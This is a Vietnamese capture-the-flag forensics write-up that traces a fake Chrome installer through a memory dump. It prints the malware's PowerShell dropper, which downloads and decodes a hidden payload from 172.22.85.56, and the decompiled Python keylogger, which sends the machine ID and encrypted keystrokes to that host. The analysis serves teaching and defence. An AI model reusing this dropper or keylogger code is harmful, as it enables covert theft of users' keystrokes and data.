# WannaGame_CyberKnight - Bad Friend

## Description: 
```text
Challenge name: Bad friend
Category: Forensics
Author: KetSoSad
Description: My friend just installed the latest version of the browser for me. However, something doesn't seem right when I use it. Please help me check what happened to my computer.
```

Bài toán cung cấp memory dump và file pcap.
```text
challenge.dmp:    MS Windows 64bit crash dump, version 15.19045, 4 processors, DumpType (0x1), 1048333 pages
challenge.pcapng: pcapng capture file - version 1.0
```
Mục tiêu là kiểm tra xem trên máy nạn nhân đã xảy ra chuyện gì khi tải một trình duyệt đáng ngờ.

Để tìm browser đáng ngờ, ta cần lục các file thực thi của trình duyệt đó, bằng cách sử dụng plugin `windows.pslist` với công cụ Volatility,
kết hợp với plugin `windows.cmdline --pid 9984`, ta thấy tiến trình `chromeup.exe` đáng ngờ, 

Nếu là Chrome chính thống, file thực thi có tên là `chrome.exe` cùng với đường dẫn `C:\Program Files..`
Trong khi đó, trong kiểm tra với plugin `windows.pslist`, xuất hiện một tiến trình thực thi browser`chromeup.exe` có tên rất lạ, cùng với đường dẫn cũng rất đáng ngờ. 

```bash
9984    5964    chromeup.exe    0xd383d2452080  27      -       1       False   2026-08-20 13:34:13.000000 UTC   N/A     Disabled`
```

<img width="1467" height="131" alt="image" src="https://github.com/user-attachments/assets/e8731056-f6e4-4277-b523-430b46f909ac" />

Cần xem bên trong file EXE đó đã làm những gì. Nhập lệnh sau để chiết xuất `chromeup.exe` về, sau đó thử `strings` xem bên trong có gì
```bash
$ mkdir extracted && vol -f challenge.dmp -o extracted_chrome windows.pslist --pid 9984 --dump
Volatility 3 Framework 2.28.2
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

9984    5964    chromeup.exe    0xd383d2452080  27      -       1       False   2026-08-20 13:34:13.000000 UTC  N/A     9984.chromeup.exe.0xb70000.dmp
```
Ở phần đầu của `chromeup.exe`:
```C#
!This program cannot be run in DOS mode.
.text
`.rsrc
@.reloc
*b(
*B(.
Yh}
1P      ot
1&      ot
$url = "http://172.22.85.56:8000/pay"
$tempFile = Join-Path $env:TEMP "pay.tmp"
try {
    Invoke-WebRequest -UseBasicParsing $url -OutFile $tempFile
    $hex = [Text.Encoding]::ASCII.GetString(
        [IO.File]::ReadAllBytes($tempFile)
    )
    $hex = $hex -replace '\s',''
finally {
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
Add-Type @'
using System;
public static class FastDecoder
    public static byte[] Decode(string hex)
    {
        byte[] output = new byte[hex.Length / 2];
        byte[] key = { 0x12, 0x34, 0x56, 0x78 };
        for (int i = 0; i < output.Length; i++)
        {
            int p = i * 2;
            int hi = Hex(hex[p]);
            int lo = Hex(hex[p + 1]);
            output[i] = (byte)(((hi << 4) | lo) ^ key[i & 3]);
        }
        return output;
    }
    private static int Hex(char c)
    {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return c - 'a' + 10;
    }
[byte[]]$bytes = [FastDecoder]::Decode($hex)
$path = "$env:TEMP\csrst.exe"
[IO.File]::WriteAllBytes($path, $bytes)
try {
    $chrome = Start-Process "chrome.exe" -PassThru
    $proc = Start-Process $path -WindowStyle Hidden -PassThru
    $chrome.WaitForExit()
    if (-not $proc.HasExited) {
        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
    }
    Get-Process -Name "csrst" -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -eq $path } |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
finally {
    Remove-Item $path -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 50000
exit
```
Phần đầu là cấu trúc tiêu chuẩn của tệp `.exe` hay `.dll`.

Dễ thấy rằng `chromeup.exe` tự động gửi GET request tới máy chủ của attacker, tải về một file có tên là `pay` để tạo `csrst`, tên gần giống `csrss.exe` của Windows nhằm ẩn mình tốt hơn khi nạn nhân mở `Task Manager` để kiểm tra. 

Scirpt phục hồi `csrst`

```python
def decode(hex):
    key = [0x12, 0x34, 0x56, 0x78]
    output = []
    for i in range(len(hex) // 2):
        p = i * 2
        hi = Hex(hex[p])
        lo = Hex(hex[p + 1])
        output.append(((hi << 4) | lo) ^ key[i & 3])
    return bytearray(output)

def Hex(c):
    if (c >= ord('0') and c <= ord('9')): 
        return c - ord('0')
    if (c >= ord('A') and c <= ord('F')): 
        return c - ord('A') + 10
    return c - ord('a') + 10

with open("pay", "rb") as f:
    data = bytearray(f.read())

with open("csrst", "wb") as f:
    f.write(decode(data))

```

`csrst` chạy ẩn mình song song khi người dùng mở trình duyệt `Google Chrome`, khi tắt thì xóa mọi dấu vết để lại. 

Cần biết `csrst` đã lén lút làm gì? Sử dụng Detect It Easy (DIE) để phân tích tĩnh

<img width="654" height="396" alt="image" src="https://github.com/user-attachments/assets/816c5ae4-7cf2-4a17-a760-05a4814608aa" />

Compiler là `PyInstaller`, sử dụng https://github.com/extremecoders-re/pyinstxtractor để decompile.

Ra được nhiều file, ta cần quan tâm đến `sol.pyc`, sử dụng https://www.decompiler.com/python để decompile, tiếp tục có được 

```python
from pynput.keyboard import Key, Listener
import socket
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
import base64
import winreg
import os
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import base64

def encrypt_aes_cbc(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return ciphertext

HOST = '172.22.85.56'
PORT = 8080
PUBLIC_KEY = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAukEBlslDfBRCjBluDnp0\njVzr4lGiS2DisGzSraABP4myImgK8r0rMDnRYu8Av/1Azi1KdUV0oC3cRFqjdTcT\nXowiE+B99vHyemW/muS/bdnhB5EDNALShTcaZj5/uGWKHyGhFOn/w+8narOFynfI\nq0aqZ9oHTf0pmPyWp+XbHmwdI1e9LT87ZCnT8CCAVrczXz84iS0zQXfp+3ggTWXG\nxAplCWJMEuTZtWzltqjxQl4DgcWMChkGsVIKmtVYVMd4IQF3TqKlRLqSwKzNkQEE\nFZ70BF0RXT8PNqoxQRLBavmIvGVa7NaL+j31uF7K+e6JucQVRV771v1KMXi0h+UK\ngQIDAQAB\n-----END PUBLIC KEY-----'
key_value = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Cryptography')
machine_guid, _ = winreg.QueryValueEx(key_value, 'MachineGuid')
winreg.CloseKey(key_value)
key = hashlib.sha256(machine_guid.encode()).digest()
computer_name = os.environ['COMPUTERNAME']
iv = hashlib.sha256(computer_name.encode()).digest()[:16]
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    info = f'{machine_guid} {computer_name}'.encode()
    rsa_key = RSA.import_key(PUBLIC_KEY)
    rsa_cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256)
    encrypted = rsa_cipher.encrypt(info)
    s.sendall(base64.b64encode(encrypted))

def on_press(keys):
    try:
        data = keys.char.encode()
    except AttributeError:
        data = str(keys).encode()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        cipher_key = encrypt_aes_cbc(data, key, iv)
        s.sendall(base64.b64encode(cipher_key))

listener = Listener(on_press=on_press)
listener.start()
listener.join()
```

Script trên có hành vi của `KeyLogger`, các thao tác trên bàn phím trên máy nạn nhân được gửi về máy của attacker, được mã hóa bằng `AES_CBC`.

Key và IV được lấy từ `machine_guid` và `machine_name` trên máy nạn nhân. Lấy ở đâu? Đối với Windows, các biến đó được lưu trữ trong `Registry Editor`


